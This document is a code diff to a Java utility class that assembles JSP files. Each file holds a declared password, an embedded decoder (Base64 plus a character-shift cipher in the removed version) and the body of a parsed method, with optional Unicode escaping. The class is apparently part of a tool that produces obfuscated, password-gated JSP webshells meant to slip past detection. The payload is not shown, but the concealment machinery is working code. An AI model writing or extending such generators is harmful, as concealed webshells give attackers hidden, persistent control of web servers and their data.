@@ -3,47 +3,29 @@ package org.sec.util;
 import com.github.javaparser.ast.body.MethodDeclaration;
 
 public class WriteUtil {
-    private static final String decodeCode = "public static String dec(String str,int offset) {\n" +
-            "        try {\n" +
-            "            byte[] code = java.util.Base64.getDecoder().decode(str.getBytes(\"utf-8\"));\n" +
-            "            str = new String(code);\n" +
-            "            char c;\n" +
-            "            StringBuilder str1 = new StringBuilder();\n" +
-            "            for (int i = 0; i < str.length(); i++) {\n" +
-            "                c = str.charAt(i);\n" +
-            "                if (c >= 'a' && c <= 'z') {\n" +
-            "                    c = (char) (((c - 'a') - offset + 26) % 26 + 'a');\n" +
-            "                } else if (c >= 'A' && c <= 'Z') {\n" +
-            "                    c = (char) (((c - 'A') - offset + 26) % 26 + 'A');\n" +
-            "                } else if (c >= '0' && c <= '9') {\n" +
-            "                    c = (char) (((c - '0') - offset + 10) % 10 + '0');\n" +
-            "                } else {\n" +
-            "                    str1 = new StringBuilder(str);\n" +
-            "                    break;\n" +
-            "                }\n" +
-            "                str1.append(c);\n" +
-            "            }\n" +
-            "            return str1.toString();\n" +
-            "        }catch (Exception ignored){\n" +
-            "            return \"\";\n" +
-            "        }\n" +
-            "    }";
+    public static void write(MethodDeclaration method, MethodDeclaration decMethod,
+                             String password, boolean useUnicode) {
+        try {
+            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
+            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
+            String decCode = decMethod.toString();
+            if (code != null && decCode != null) {
+                String source = code.substring(1, code.length() - 2);
+                String newCode = compactCode(source);
+                String newDecCode = compactCode(decCode);
 
-    public static void write(MethodDeclaration method, String password) {
-        String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
-        String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
-        if (code != null) {
-            String source = code.substring(1, code.length() - 2);
-            String newCode = compactCode(source);
-            newCode = UnicodeUtil.encodeString(newCode);
-            String newDecodeCode = UnicodeUtil.encodeString(decodeCode);
-            String output = passwordCode + "<%!" + newDecodeCode + "%><% " + newCode + " %>";
-            source = passwordCode + "<%!" + decodeCode + "%><%" + source + " %>";
-            try {
-                FileUtil.writeFile("code.jsp", source);
-                FileUtil.writeFile("result.jsp", output);
-            } catch (Exception ignored) {
+                if (useUnicode) {
+                    newCode = UnicodeUtil.encodeString(newCode);
+                    newDecCode = UnicodeUtil.encodeString(newDecCode);
+                    String output = passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
+                    FileUtil.writeFile("result.jsp", output);
+                } else {
+                    String output = passwordCode + "<%!" + decCode + "%><%" + source + " %>";
+                    FileUtil.writeFile("result.jsp", output);
+                }
             }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
